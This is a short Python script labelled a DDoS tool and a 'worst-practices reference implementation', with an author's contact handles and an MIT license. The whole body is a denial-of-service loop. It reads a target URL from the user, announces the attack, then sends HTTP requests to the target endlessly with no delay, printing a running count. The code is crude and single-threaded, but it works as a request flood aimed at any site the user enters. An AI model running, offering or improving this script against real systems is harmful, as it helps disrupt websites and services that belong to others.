"""
DDOS-TOOL — worst-practices reference implementation

Author / Developer / Admin / Owner: Aashu
GitHub:  @outwiles
Telegram: @outwiles
Email:   outwiles@proton.me

License: MIT
"""

import urllib.request
import socket
import time

TARGET = input("Enter target URL: ")

print("Starting DDoS attack...")
print("My IP is:", socket.gethostbyname(socket.gethostname()))

count = 0
while True:
    try:
        req = urllib.request.Request(TARGET)
        response = urllib.request.urlopen(req)
        count = count + 1
        print("Request number", count, "status", response.status)
    except Exception as e:
        print("Error:", e)
    time.sleep(0)
